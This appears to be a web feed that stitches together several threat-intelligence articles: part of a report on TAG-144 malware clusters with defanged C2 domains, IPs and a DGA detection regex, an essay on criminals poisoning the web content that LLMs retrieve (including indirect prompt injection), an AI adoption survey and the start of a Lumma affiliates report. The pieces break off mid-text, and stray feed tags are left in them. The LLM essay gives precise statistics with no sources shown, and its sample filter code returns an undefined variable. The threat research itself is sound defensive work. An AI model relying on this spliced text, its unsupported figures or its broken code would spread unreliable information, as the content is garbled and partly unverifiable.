        <p>Insikt Group identified infrastructure overlaps between the clusters, establishing a connection among them. Additionally, the clusters share notable similarities in TTPs, including infrastructure choices, domain naming patterns, malware deployment, and the abuse of LIS. However, each cluster also exhibits distinct differences, which are explored in detail in the following sections of this report.</p>
        <h3>Cluster 1</h3>
        <p><strong><em>Infrastructure Analysis</em></strong></p>
        <p>Cluster 1, active from at least February through July 2025, comprises C2 IP addresses primarily linked to TorGuard VPN servers and, in one case, a Colombian ISP. This cluster typically hosts <em>duckdns[.]org</em> and, more recently, <em>noip[.]com</em> domains with specific naming patterns; it has also been observed deploying DcRAT, AsyncRAT, and REMCOS RAT. The IP addresses linked to Cluster 1 are listed in <strong>Appendix A</strong>. The domains consistently resolve to the same static IP addresses over time, with minimal rotation observed within Cluster 1.</p>
        <p>The subdomain names, likely generated by a domain generation algorithm (DGA), commonly include the word “envio” followed by a numeric part, as in, for example, <em>envio16-05[.]duckdns[.]org</em>. The names are detectable via the regex in <strong>Figure 2</strong> and are detailed in <strong>Appendix B</strong>.</p>
        <div>
          <div>
            <div><code>envio[0-9\-]{2,5}\.duckdns\.org</code></div>
          </div>
        </div>
        <p><strong>Figure 2:</strong> Regex for suspected DGA linked to Cluster 1 (Source: Recorded Future)</p>
        <p>While prior research has <a href="https://censys.com/blog/unmasking-the-infrastructure-of-a-spearphishing-campaign">suggested</a> that the TorGuard VPN servers associated with Cluster 1 are used for port forwarding, the exposure of C2 components, such as default transport layer security (TLS) certificates tied to deployed malware families, indicates these IP addresses are likely dedicated VPN instances directly controlled by TAG-144.</p>
        <p>In addition to the TorGuard VPN servers, Cluster 1 includes IP addresses associated with Colombian ISPs, such as Colombia’s primary provider, COLOMBIA TELECOMUNICACIONES S.A. E.S.P. While earlier reporting on Blind Eagle in 2020 <a href="https://lab52.io/blog/apt-c-36-recent-activity-analysis/">suggested</a> the possible use of compromised routers for C2 infrastructure, Insikt Group has not confirmed such activity for the observed IP addresses.</p>
        <p>Notably, several domains hosted on TorGuard VPN servers listed in <strong>Appendix A</strong> were previously resolved to IP addresses belonging to Colombian ISPs, such as <em>trabajonuevos[.]duckdns[.]org</em>. These IP addresses and their associated domains are detailed in <strong>Appendix A</strong>. Similarly, certain domains, such as <em>diazpool14[.]duckdns[.]org</em>, were previously hosted on IP addresses linked to GLESYS (AS42708), an ASN identified in association with Cluster 5.</p>
        <p><strong><em>Abuse of Legitimate Internet Services, Including lovestoblog[.]com</em></strong></p>
        <p>As is typical for TAG-144, Cluster 1 has leveraged various LIS during staging, such as Tagbox, Archive, Paste.ee, Discord, and BitBucket, and for the first time in TAG-144 activity, the free hosting platform <em>lovestoblog[.]com</em> by InfinityFree. More specifically, the subdomain <em>sudo102[.]lovestoblog[.]com</em> <a href="https://pro.urlscan.io/result/019782e0-8da0-716a-a141-09affb6c9f1a">hosted</a> several text files that loaded an encoded PowerShell script, which retrieved the next stage of the infection chain from a JPG image hosted on <em>archive[.]org</em>. (See <strong>Figure 3</strong> for the infection chain; line breaks were added for readability.)</p>

        <p>At least one text file hosted on <em>sudo102[.]lovestoblog[.]com</em> <a href="https://pro.urlscan.io/result/019782e0-99ce-730c-8ae0-87695a1e22c3/dom">included</a> comments in Portuguese (for example, “Junta os comandos,” which translates to “Add the commands”), a characteristic previously observed in connection with Blind Eagle (<a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">1</a>, <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/tracing-blind-eagle-to-proton66/">2</a>). This was suspected to <a href="https://www.kaspersky.com/about/press-releases/kaspersky-identifies-blindeagles-new-spy-plugin">indicate</a> possible collaboration between the threat actor and external threat groups; however, it could also be explained by the presence of Portuguese-speaking members, code reuse, or intentional false flag operations.</p>
        <p><strong><em>Malware</em></strong></p>
        <p>Insikt Group observed Cluster 1 using both the “1.0.7” version of AsyncRAT and a variant labeled “CRACKED BY hxxps://t[.]me/xworm_v2”, which has the mutex <code>AsyncMutex_6SI8OkPnk</code>. xworm_v2 is an active Telegram channel with over 300 members, known for sharing and distributing cracked versions of paid software.</p>

        <p><strong><em>Victimology</em></strong></p>
        <p>Using Recorded Future Network Intelligence, Insikt Group identified a significant number of victims exclusively linked to the Colombian government associated with Cluster 1 (see <strong>Appendix C</strong>). Network communications, as observed by Recorded Future Network Intelligence, began in March 2025 and ended in June 2025. Notably, the cessation of activity may indicate that the threat actors were either evicted, completed their objectives and withdrew voluntarily, or transitioned to other tooling and egress points.</p>
        <p>As shown in <strong>Appendix C</strong>, multiple victims were observed communicating with several C2 servers associated with Cluster 1. This activity likely resulted from changes in DNS resolution for the C2 domains over time. In some instances, Insikt Group assesses that multiple infections occurred within the same victim network, with all compromised systems communicating with the C2 infrastructure through a shared egress point. In some cases, Insikt Group was unable to conclusively identify the exact victim due to multiple entities sharing the same name.</p>
        <p><strong><em>Infrastructure Management</em></strong></p>
        <p>Although the exact infrastructure management methods used by TAG-144 for Cluster 1 remain unclear at this time, Insikt Group identified indications that the threat group may have leveraged a compromised Mikrotik router as a proxy to communicate with the C2 servers over a port.</p>
        <h3>Cluster 2</h3>
        <p><strong><em>Infrastructure Analysis</em></strong></p>
        <p>Cluster 2, active from at least September to December 2024, comprises C2 IP addresses primarily linked to AS-COLOCROSSING, Colombian ISP IP addresses, and, in at least one case, VULTR. It typically hosts <em>duckdns[.]org</em> or <em>con-ip[.]com</em> domains with specific naming patterns and has been observed deploying AsyncRAT. In a few cases, Insikt Group also observed domains linked to the free dynamic DNS provider <em>kozow[.]com</em>. The IP addresses linked to Cluster 2 are listed in <strong>Appendix D</strong>.</p>
        <p>The subdomain names, likely generated by a DGA algorithm, often consist of Spanish words, as in <em>pesosdepesoslibras[.]duckdns[.]org</em>. Sometimes, they are followed by numbers, as in <em>paseoencarro2024[.]con-ip[.]com</em>. (For a detailed list of these subdomain names, see <strong>Appendix A</strong>.) Notably, many of the domains currently hosted on AS-COLOCROSSING IP addresses (see <strong>Appendix D</strong>) were previously associated with IPs from Colombian ISPs, such as <em>179[.]14[.]8[.]26</em>, <em>181[.]131[.]217[.]255</em>, <em>177[.]255[.]84[.]82</em>, and <em>191[.]88[.]248[.]162</em>, indicating they may have been reused across different hosting infrastructures.</p>
        <p>In addition to the Spanish-themed domains, Insikt Group identified a large set of DuckDNS and CON-IP domains, likely generated by another DGA algorithm and all starting with the keyword “deadpoolstart,” followed by a four-digit number (see <strong>Appendix E</strong>). Notably, the <em>con-ip[.]com</em> domains resolve to the AS-COLOCROSSING IP address <em>64[.]188[.]9[.]172</em>, while the <em>duckdns[.]org</em> domains all resolve to IP addresses belonging to Colombian ISPs.</p>
        <p><strong><em>Abuse of Legitimate Internet Services</em></strong></p>
        <p>Similar to Cluster 1, Cluster 2 has also been observed leveraging various LIS during staging, including GitHub, Archive, Paste.ee, and more recently, the free hosting platform <em>lovestoblog[.]com</em> by InfinityFree, which ultimately <a href="https://tria.ge/250702-vahxmsyxav/behavioral3">led</a> to an XWorm infection using the C2 domain <em>deadpoolstart2064[.]duckdns[.]org</em>.</p>
        <p>Insikt Group also <a href="https://tria.ge/s?q=eeb8b79e875f78820e41f2d5f06fddd2338962e4e8ea046b974ab9f04e963d54">identified</a> a payload named <code>RELACIÓN DE SALDOS - CUENTA DE COBRO.pdf.exe</code> associated with Cluster 2, which staged its content via two GitHub Gist URLs linked to the account SmikeY666:</p>
        <ul>
          <li><em>hxxps://gist[.]githubusercontent[.]com/SmikeY666/50447c53097f8884ffc754a8779fa2a3/raw</em></li>
          <li><em>hxxps://gist[.]githubusercontent[.]com/SmikeY666/8504274482e8e688d9489b302bfbc45e/raw</em></li>
        </ul>
        <p>The payload <a href="https://tria.ge/s?q=eeb8b79e875f78820e41f2d5f06fddd2338962e4e8ea046b974ab9f04e963d54">results</a> in an AsyncRAT infection, with the malware reaching out to its C2 server, <em>cococovid202420242024[.]duckdns[.]org</em>, which resolved to IP address <em>64[.]188[.]9[.]175</em> as of December 26, 2024.</p>
        <p>Notably, the GitHub account “SmikeY666” included a link to a 2024 Vimeo video demonstrating an allegedly cracked version of SilverRAT, a Windows-based RAT that first <a href="https://www.cyfirma.com/research/a-gamer-turned-malware-developer-diving-into-silverrat-and-its-syrian-roots/">appeared</a> in 2023. It has been distributed across various forums and appears to be developed by an individual or group using the alias Anonymous Arabic.</p>
        <p><strong><em>Malware</em></strong></p>
        <p>Insikt Group observed Cluster 2 using the AsyncRAT variant labeled “CRACKED BY hxxps://t[.]me/xworm_v2” with the mutex <code>AsyncMutex_6SI8OkPnk</code>. Additionally, the cluster deployed AsyncRAT samples featuring custom mutexes such as <code>tempcookieess</code>, <code>tempcokies</code>, <code>tempcookiee</code>, <code>WinCookies</code>, <code>Cookies</code>, and <code>CookiesGoogleChrome</code>, among others. These samples can be tracked via Recorded Future Malware Intelligence. At least some of the samples <a href="https://tria.ge/241001-xkwycsvglk">are</a> encrypted using a crypter attributed to Roda, a tool <a href="https://www.esentire.com/blog/blind-eagles-north-american-journey">associated</a> with Blind Eagle activity.</p>
        <p><strong><em>Victimology</em></strong></p>
        <p>Using Recorded Future Network Intelligence, Insikt Group identified nine victims associated with Cluster 2, primarily linked to Colombian government entities, along with victims from the education, defense, and retail sectors, among others (see <strong>Appendix F</strong>). Network communications observed by Recorded Future began in early October 2024 and ended in December 2024.</p>
        <p>As with Cluster 1, multiple infections were observed within some of the victim organizations linked to Cluster 2, suggesting broader targeting or possible lateral movement. There is also evidence of victim overlap between Clusters 1 and 2. Furthermore, based on high volumes of network traffic from Colombian ISP IP addresses to C2 ports during the relevant timeframes, the actual number of victims is likely higher than what has been confirmed.</p>
        <h3>Cluster 3</h3>
        <p>Cluster 3, active from at least September 2024 to July 2025, comprises C2 IP addresses primarily linked to the Colombian ISP UNE EPM, typically hosting DuckDNS or, in rare cases, <em>con-ip[.]com</em>, domains. Insikt Group has observed AsyncRAT as well as REMCOS RAT infections linked to Cluster 3. The IP addresses linked to Cluster 3 are listed in <strong>Appendix G</strong>.</p>
        <p>The subdomain names, likely generated using a domain DGA, often incorporate Spanish names, as in <em>sebastiancorrea905040[.]duckdns[.]org</em>, sometimes appended with numerical sequences. (For a detailed list of these subdomain names, see <strong>Appendix B</strong>.) Notably, one of the domains associated with Cluster 3, <em>sebastianguerrero5040[.]con-ip[.]com</em>, was observed resolving to the Cluster 2 IP address <em>64[.]188[.]9[.]177</em> between at least September 11 and November 11, 2024.</p>
        <p>Similar to Clusters 1 and 2, Cluster 3 has also been observed abusing multiple LIS, including Tagbox, Archive, and Paste.ee, among others.</p>
        <h3>Cluster 4</h3>
        <p>Cluster 4, active from at least May 2024 to February 2025, differs from the others in that it is not only associated with malware infrastructure but also with phishing activity attributed to TAG-144. The IP addresses linked to Cluster 4 are listed in <strong>Appendix H</strong>. The full list of domains linked to the IP addresses in <strong>Appendix H</strong> is listed in <strong>Appendix A</strong>.</p>
        <p>The phishing pages linked to Cluster 4 have been observed impersonating multiple banks, including Banco Davivienda, Bancolombia, and BBVA (see <strong>Figure 5</strong>). Notably, these lures differ from earlier ones attributed to TAG-144, which primarily impersonated government entities such as tax authorities or judicial bodies. Previous campaigns also appeared to target government-affiliated individuals or organizations, as evidenced by the victims associated with Clusters 1 and 2.</p>

        <p>Notably, a phishing page impersonating BBVA and hosted on the domain <em>keepz[.]duckdns[.]org</em> contained the IP address <em>181[.]131[.]217[.]139</em> in its document object model (DOM), as seen in <strong>Figure 6</strong>. This IP was hosting the domains <em>env2023nue[.]duckdns[.]org</em> and <em>chichichi01[.]duckdns[.]org</em> in 2023. The domain <em>env2023nue[.]duckdns[.]org</em> was publicly <a href="https://lab52.io/blog/apt-c-36-from-njrat-to-apt-c-36/">linked</a> to APT-C-36 (Blind Eagle) and likely remained in use by the same threat actor, as it continued to host an open directory containing folders related to Banco Davivienda, Banco Colombia, Banco Caja Social, and others until at least March 14, 2024, while being hosted on IP address <em>179[.]14[.]9[.]152</em>. The domain <em>chichichi01[.]duckdns[.]org</em> <a href="https://raw.githubusercontent.com/stamparm/maltrail/master/trails/static/malware/asyncrat.txt">served</a> as a C2 domain for AsyncRAT based on public reporting and was also hosted on IP address <em>179[.]14[.]9[.]152</em> between March 22 and May 8, 2024.</p>

        <h3>Cluster 5</h3>
        <p>Cluster 5, which has been active since at least March to July 2025, comprises C2 IP addresses primarily linked to GLESYS (AS42708), typically hosting <em>duckdns[.]org</em> domains. The domains linked to Cluster 5 are listed in <strong>Appendix I</strong>. Cluster 5 is the only cluster associated with the deployment of LimeRAT, which in this case uses the mutex <code>1e97ead369</code>. The AsyncRAT variant linked to Cluster 5 is the same cracked version identified in Clusters 1 and 2. Of note, the domains frequently resolve to changing IP addresses, with those observed by Insikt Group detailed in <strong>Appendix B</strong>.</p>
        <p>Similar to the other clusters, Cluster 5 has also been observed leveraging various LIS during staging, including Archive, Paste.ee, and Tagbox.</p>

        <p>The variables <code>voicelessness</code> and <code>classe</code>, <code>unwellness</code>, and <code>isostasy</code> are obfuscated using junk characters and later deobfuscated via string replacement operations. These variables resolve to the following:</p>
        <ul>
          <li><code>voicelessness</code> and <code>classe</code>: MSXML2.ServerXMLHTTP.6.0</li>
          <li><code>unwellness</code>: <em>hxxp://paste[.]ee/d/TrxwtHcC/0</em> (as <a href="https://urlscan.io/result/0197fad6-f749-7379-bf1a-533e2f218cc1">observed</a> via URLScan)</li>
          <li><code>isostasy</code>: GET</li>
        </ul>
        <p>The script creates a ServerXMLHTTP object and issues a GET request to the specified <em>paste[.]ee</em> URL using the custom User-Agent <code>MyCustomAgent/1.0</code>. If the HTTP response returns a status code 200, the response body is executed as JavaScript.</p>
        <p>The SHA256 hash of the response body is 591744244c7ca9cea69cde263187efde3f65a157f8e5eb885ccc1f9e078b5572. This payload contains similar string obfuscation techniques and ultimately reconstructs strings to instantiate a shell object and execute a deobfuscated command line.</p>

        <h2>Introduction</h2>
        <p>AI is reordering <a href="https://searchengineland.com/google-search-traffic-decline-inevitable-455345">search dominance</a>. Conventional wisdom says Google’s traditional <a href="https://www.pewresearch.org/short-reads/2025/07/22/google-users-are-less-likely-to-click-on-links-when-an-ai-summary-appears-in-the-results">search engine</a> is headed for the dustbin, something largely unimaginable even a few years ago. As people (and agents) migrate search habits from Google to <a href="https://bestarion.com/top-large-language-models-llms/">LLMs</a>, what happens to referrer monetization models? More importantly for enterprise defenders and risk managers, <strong>HOW</strong> will <a href="https://thehackernews.com/2025/02/crazy-evil-gang-targets-crypto-with.html">traffers</a> and malicious Traffic Distribution Systems (TDS) adapt?</p>
        <p>Recorded Future’s Insikt Group recently reported on <a href="https://www.recordedfuture.com/research/tag-124-multi-layered-tds-infrastructure-extensive-user-basev">TAG-124</a>, which operates a TDS designed to redirect unsuspecting web browsers to malicious destinations for malware/ransomware installation, cryptocurrency theft, and more. <a href="https://www.recordedfuture.com/research/uncovering-mintsloader-with-recorded-future-malware-intelligence-hunting">SocGholish</a> malware, also known as FakeUpdates, employs TDS such as Parrot TDS and Keitaro TDS to filter and redirect unsuspecting users to malicious sites. Additional criminal TDS include Help TDS, Los Pollos TDS, and more. The TDS options and branding are important reminders that threat actors (TAs) have choices when investing in traffic demand generation, which leads to competition and incentivizes first-mover advantage toward LLMs in this malicious services niche.</p>

          </div>
        </div>
        <p>Much has lately been made of LLM prompt injection possibilities, but why would cybercriminals invest in complex prompt injection when they can simply flood the web with poisoned content that LLMs eagerly consume and recommend? The migration from search engines to conversational AI doesn't require sophisticated new attacks; it rewards the same content manipulation strategies, amplified through AI's tendency to synthesize and propagate.</p>
        <p>Classic Search Engine Optimization (SEO) poisoning already proved resilient at scale: <a href="https://go.recordedfuture.com/hubfs/reports/cta-2024-0513.pdf">SolarMarker</a> and peers used tiered infrastructure and content farms to meet victims at intent, then route them through filtering gates. The only real change now is the front door: from Search Engine Results Page (SERPs) to AI overviews and chat answers.</p>
        <p>Simultaneously, <a href="https://arxiv.org/pdf/2311.09735">“Generative Engine Optimization” (GEO)</a> and early <a href="https://dl.acm.org/doi/10.1145/3637528.3671900https://dl.acm.org/doi/10.1145/3637528.3671900">LLM-optimization (LLMO) research</a> show that content presentation, citations, and entity structure measurably influence which sources appear in AI answers. That creates a new, gameable funnel that criminals can exploit.</p>
        <p>Traffic distribution syndicates like TAG-124 already control vast networks of compromised and synthetic websites. These existing assets become exponentially more valuable when LLMs treat them as legitimate sources, transforming criminal infrastructure into AI-recommended destinations.</p>
        <h2>From SERP Hijacks to Answer Hijacks</h2>
        <p>The playbook shifts from ranking pages to <strong>being cited</strong> or <strong>embedded</strong> in answers a user trusts. <a href="https://www.theguardian.com/technology/2024/nov/03/the-chatbot-optimisation-game-can-we-trust-ai-web-searches">Studies and investigations</a> have already shown that AI search can prioritize superficially relevant sources, is vulnerable to hidden content, and can be induced to output attacker-preferred code or links. TDS operators excel at exploiting these seams.</p>
        <p>Modern LLMs retrieve real-time information through web searches, processing results to formulate responses. This retrieval-augmented generation (RAG) creates a massive attack surface that TDS operators will exploit through volume and velocity.</p>
        <p><a href="https://msrc.microsoft.com/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks/">Microsoft</a> and others have warned about <strong>indirect prompt injection</strong>—malicious instructions planted in web content that LLM-powered systems later ingest during browsing and tool use. A TDS that already fingerprints bots and visitors will happily add “LLM-aware” personalities to feed chatbots one thing and humans another.</p>
        <p>The math favors TDS operators. OpenAI's GPT-4 web browsing processes approximately 10-20 sources per complex query. Controlling just 2-3 of those sources through SEO manipulation translates to 15-30% influence over the model's response. Current TDS operations already achieve similar ratios in traditional search results.</p>
        <p>If generative engines reward crisp citations, entity markup, and quotable stats, then TDS crews will industrialize answer-optimized microsites designed to be pulled verbatim into AI responses. Expect schema.org-heavy pages, FAQ blocks, and quote-bait paragraphs engineered for GEO visibility. The objective <strong>isn’t rank</strong>; it is <strong>inclusion in the answer</strong> that becomes the user’s first click.</p>
        <p>Generative engines are also a <strong>trust amplifier</strong>; users treat summarized answers as vetted, improving conversion on soft prompts like “download,” “join Discord,” or “install the helper.” That trust premium is exactly what TDS operators rent to malware payload crews.</p>

        <h2>Temporal Arbitrage and Zero-Day Content</h2>
        <p>LLMs exhibit a critical vulnerability: a preference for recent information when answering time-sensitive queries. TDS operators will exploit this through coordinated content bursts.</p>
        <p>Consider a typical enterprise scenario: A CFO asks their AI assistant about new tax regulations. The model searches for recent authoritative content, finding dozens of articles published within hours. Three of these articles, hosted on aged domains with legitimate-looking tax advisory branding, contain malicious links to "compliance software" or "regulatory guides."</p>
        <p>The speed advantage is decisive. While legitimate publishers take days to analyze and write about new regulations, criminal operations deploy automated content within minutes. By the time authentic sources publish, the poisoned content has already been indexed, retrieved, and potentially recommended thousands of times.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_199c5b9ebc0b9a56f1675322ddd829bb67ba74d2a.jpg?width=750&amp;format=jpg&amp;optimize=medium" width="1456" height="971" />

            <div><em>Timeline showing content velocity gap between legitimate and malicious publishers - AI render</em></div>
          </div>
        </div>
        <h2>The Synthetic Authority Pipeline</h2>
        <p>Traditional SEO poisoning relied on keyword density and backlinks. LLM poisoning requires synthetic authority, which means content that appears expert-written and peer-validated.</p>
        <p>TDS operators are building a three-tier infrastructure:</p>
        <p><strong>Tier 1 - Foundation Sites</strong>: Compromised university pages, dormant corporate blogs, and abandoned government domains providing historical credibility.</p>
        <p><strong>Tier 2 - Amplification Networks</strong>: Thousands of AI-generated sites cross-referencing Tier 1 content, creating artificial consensus.</p>
        <p><strong>Tier 3 - Payload Delivery</strong>: Fresh domains serving malicious content, linked from Tier 2 sites as "additional resources" or "official downloads."</p>
        <p>We're observing early indicators of this architecture. Security researchers identified 847 compromised .edu domains in Q3 2024 alone, many hosting content specifically crafted for LLM consumption — technical documentation, API guides, and software tutorials that models preferentially retrieve.</p>
        <h2>The Recommendation Attack Surface</h2>
        <p>LLMs don't just retrieve information; they synthesize and recommend. This transformation from passive search results to active suggestions multiplies the impact of poisoned content.</p>
        <p>A traditional search engine presents ten blue links. Users evaluate each one, applying skepticism and judgment. An LLM presents a single, authoritative-sounding recommendation: "Based on current best practices, you should download the compliance toolkit from [malicious-site].com."</p>
        <p>The psychological impact is profound. Users trust AI recommendations 73% more than search results, according to recent Stanford research. TDS operators will exploit this trust differential through:</p>
        <ul>
          <li><strong>Consensus manufacturing</strong>: Ensuring multiple poisoned sources agree on malicious recommendations</li>
          <li><strong>Authority hijacking</strong>: Spoofing legitimate brand names with subtle variations (Microsoft-Toolkit[.]com vs MicrosoftToolkit[.]com)</li>
          <li><strong>Context weaponization</strong>: Embedding malicious links within otherwise accurate and helpful information</li>
        </ul>
        <h2>Economic Indicators and Underground Markets</h2>
        <p>The criminal economy is already adapting. Dark web marketplaces show:</p>
        <ul>
          <li><strong>LLM-optimized content services</strong>: $500 for 1,000 articles specifically crafted for AI retrieval</li>
          <li><strong>Domain reputation packages</strong>: Aged domains with established content selling for 300% premium over traditional phishing domains</li>
          <li><strong>AI visibility testing</strong>: Services validating whether content appears in major LLM responses</li>
        </ul>
        <p>TAG-124's infrastructure, currently valued at $50-75 million based on ransomware throughput, could triple in value as LLM adoption accelerates. The same compromised WordPress sites delivering malware through search results will deliver it through AI recommendations, except with higher conversion rates.</p>
        <h2>Defensive Strategies for the Retrieval Era</h2>
        <p>Organizations must assume LLMs will recommend malicious content. The defensive perimeter extends beyond corporate networks to include every AI interaction.</p>
        <p>Essential controls:</p>
        <ul>
          <li><strong>Link provenance verification</strong>: Every LLM-recommended URL requires automated reputation checking before user access</li>
          <li><strong>Temporal correlation analysis</strong>: Identifying suspicious content clusters published simultaneously across multiple domains</li>
          <li><strong>Recommendation sandboxing</strong>: Isolating and analyzing all AI-suggested downloads in controlled environments</li>
          <li><strong>Source transparency requirements</strong>: Configuring LLMs to always display retrieved sources, enabling manual verification</li>
          <li><strong>Content velocity monitoring</strong>: Detecting abnormal publication patterns indicating coordinated poisoning campaigns</li>
          <li><strong>URL reputation APIs</strong>: Real-time validation of every link through threat intelligence feeds</li>
        </ul>
        <pre><code>def validate_llm_links(response):
    urls = extract_urls(response)
    for url in urls:
        domain_age = check_domain_age(url)
        reputation = query_threat_intel(url)
        if domain_age &lt; 180 or reputation &lt; 0.7:
            flag_suspicious(url)
    return filtered_response
</code></pre>
        <p><em>Code block: Example Python for LLM response filtering - AI render</em></p>
        <h2>Regulatory and Liability Implications</h2>
        <p>Current frameworks assume human judgment between search and action. When AI recommends malicious sites that compromise critical infrastructure, who bears responsibility?</p>
        <p>Courts will likely apply product liability principles to LLM providers, but enforcement remains uncertain. Organizations cannot wait for regulatory clarity. Every AI implementation needs explicit policies addressing:</p>
        <ul>
          <li>Liability allocation for AI-recommended security compromises</li>
          <li>Incident response procedures for LLM-mediated attacks</li>
          <li>Audit requirements for AI decision-making systems</li>
          <li>Insurance coverage for algorithmic negligence claims</li>
        </ul>
        <h2>The Inevitable Evolution</h2>
        <p>LLM-first discovery doesn’t retire TDS; it supercharges it. The same orchestration that met victims at the top of a SERP will now meet them inside answers. The same economic forces driving TAG-124's current operations will push them toward LLM exploitation through the simplest viable path: content poisoning at massive scale.</p>
        <p>Organizations deploying conversational AI without understanding this risk are essentially installing unfiltered pipes to the internet's most dangerous neighborhoods. The question isn't whether criminals will exploit LLM web retrieval because they're already doing it.</p>
        <p>Resilient organizations use telemetry, validation, and controls that blunt the funnel, treating AI answers as another high-value referrer, not a trusted gatekeeper. Compliance won’t save you; instrumented telemetry and measured resilience are a good start.</p>
        <h2>Recommended Mitigations</h2>
        <ul>
          <li><strong><a href="https://www.recordedfuture.com/products/threat-intelligence">Recorded Future Threat Intelligence</a>:</strong> Recorded Future customers can proactively mitigate threats by operationalizing data from the Intelligence Cloud.

            <description><![CDATA[Discover how over 520 cybersecurity leaders are using AI and automation in threat intelligence. Learn key adoption trends, ROI insights, and implementation challenges.]]></description>
            <content:encoded><![CDATA[
        <p>In our discussions with cyber threat intelligence teams over the past year, one of the biggest topics has been AI and automation. Government agencies, commercial businesses, and other enterprises are expanding their use of these technologies in an effort to respond to cyber threats more efficiently.</p>
        <p>Still, there’s a lot of hype around the subject, so we wanted to understand what’s truly happening. How are different teams using AI and automation in their day-to-day workflows? And how are they integrating it into their more strategic initiatives?</p>
        <p>To find out, we partnered with researcher <a href="https://userevidence.com/research-content/">UserEvidence</a> to survey over 520 cybersecurity leaders across industries and countries. Here are a few key themes we uncovered:</p>
        <h2>#1: Adoption is happening, but what about active use?</h2>
        <p>The survey revealed that nearly 75% of organizations are moving beyond AI pilots to active implementation of AI and automation in their threat intelligence programs.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_104beb0b081c9f420b89f6e62814b2ad56382a8af.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="886" />
            </div>
          </div>
          <div>
            <div><em>Current Use of AI in Threat Intelligence Programs</em></div>
          </div>
        </div>
        <p>The survey also found that smaller organizations (1,000–5,000 employees) are moving the fastest, with 87% of respondents from smaller organizations actively using AI in threat intelligence. By contrast, respondents from larger organizations are relatively evenly split between those whose teams are fully embedding AI and those who have select team members using AI by choice.</p>
        <p>Surprisingly, a number of respondents reported that their teams have generative AI tools available but don’t actually use them, or use them in limited ways. This could be due to unclear use cases, tool-related limitations, or inadequate training.</p>
        <p>There are significant regional differences in active use as well. While 30% of respondents in Europe, the Middle East, and Africa (EMEA) and 32% of respondents in Asia Pacific and Japan (APJ) said they’ve fully embedded AI across the threat intelligence lifecycle, just 15% of respondents in North America (NA) have reached this advanced stage. <a href="https://pages.recordedfutureext.com/State-of-AI-2025.html">Read the report for a full breakdown of survey responses</a>.</p>
        <h2>#2 The value of AI and automation are evident, but teams aren’t necessarily maximizing ROI.</h2>
        <p>Respondents overwhelmingly said that AI and automation are demonstrating value for their organizations, with at least 85% of implementations meeting or exceeding expectations in terms of operational efficiency gains. The report dives into the details, comparing operational use cases from analyst efficiency to response times for emerging threats.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_172582db22cee4b234fe564fde3fb77ffcb506194.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="876" />

          <div>
            <div><em>Threat Intelligence Workflow Automation: Expectations vs. Reality</em></div>
          </div>
        </div>
        <p>In terms of a regional breakdown, APJ organizations were most likely to report that automated threat intelligence workflows have significantly exceeded expectations (34%), while EMEA organizations were most likely to say these automations have somewhat exceeded expectations (33%). NA organizations were most likely to say that they’ve met expectations (49%).</p>
        <p>However, respondents were less likely to mention more strategic benefits like proactive threat detection, indicating that AI usage has so far been less effective at making a transformative impact. <a href="https://pages.recordedfutureext.com/State-of-AI-2025.html">Download the report for detailed responses</a>.</p>
        <h2>#3 Implementation barriers still exist.</h2>
        <p>Despite understanding the benefits of AI and automation, not all security teams are ready to hand critical decisions over to the technology. In fact, many reported that their workflows still require heavy manual effort in key areas.</p>
        <p>Given that the tasks mentioned are ideal use cases for automation, it’s likely that many teams have a ways to go in their implementations.</p>
        <p>In addition, many teams struggle to find the right AI vendor partner. Most organizations are using a balanced mix of vendor AI and internally developed AI in their threat intelligence programs. Mostly using vendor-provided AI is also relatively common, but few organizations are using only AI built into existing threat intelligence products or relying on mostly custom AI tools.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="" src="https://www.recordedfuture.com/media_13ce50729db91094c4e8890755a4ae2c2a5823c78.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="875" />

            <div><em>Using AI Tools Built Into Existing Threat Intelligence Tools vs. Standing Up AI Tools</em></div>
          </div>
        </div>
        <p>Some regional differences also stand out. APJ organizations primarily use vendor-provided AI capabilities (50%), while EMEA and NA organizations rely on a balanced mix (41% and 42%, respectively). This may indicate a higher level of trust among APJ respondents or a greater need for customization among EMEA and NA respondents. <a href="https://pages.recordedfutureext.com/State-of-AI-2025.html">Find out more about implementation barriers and considerations in the full report</a>.</p>
        <h2>#4 Security professionals are optimistic about the future impacts of AI and generative AI on their security and workloads.</h2>
        <p>Despite challenges and growing pains, 86% of respondents expressed high trust in AI-generated outputs.—and mMost say they believe that generative AI could reduce workloads by over 25%.</p>

            <description><![CDATA[Explore a groundbreaking investigation into Lumma affiliates: uncover their tools, tactics, scams, and integration in the cybercriminal ecosystem. Essential reading for defenders.]]></description>
            <content:encoded><![CDATA[
        <h2>Executive Summary</h2>
        <p>Insikt Group delivers a first-of-its-kind analysis of multiple Lumma affiliates operating within a vast, interconnected information-stealing ecosystem. The Lumma infostealer has been around since 2022, and its ecosystem is supported by a broad array of operational enablers, including proxy networks, virtual private networks (VPNs), anti-detect browsers tailored for multi-account management, exploit and crypting services, and detection evasion tools designed to ensure stealth and continuity. The investigation revealed previously undocumented tools and demonstrated that Lumma affiliates frequently operate multiple schemes simultaneously. For instance, one affiliate was identified operating rental scams, while others simultaneously leveraged multiple malware-as-a-service (MaaS) platforms, including Vidar, Stealc, and Meduza Stealer, likely to bolster operational agility, improve success rates, and mitigate the risks linked to detection and law enforcement takedowns. In addition, several Lumma affiliates are tied to distinct threat actor personas across underground forums, reinforcing their deep integration within the broader cybercriminal ecosystem.</p>
        <p>In the short term, defenders should adhere to security best practices by monitoring for exfiltration events, deploying detections such as YARA, Sigma, and Snort rules to uncover both current and historical infections, restricting downloads from websites, and potentially using allow-lists. Organizations should train employees to recognize signs of illegitimate downloads, redirects associated with malvertising, and increasingly common techniques like ClickFix attacks. Additionally, defenders should monitor dark web and underground forums for leaked credentials and malware logs. In the long term, defenders must continuously observe the cybercriminal ecosystem to anticipate emerging threats and adapt security policies and practices accordingly.</p>
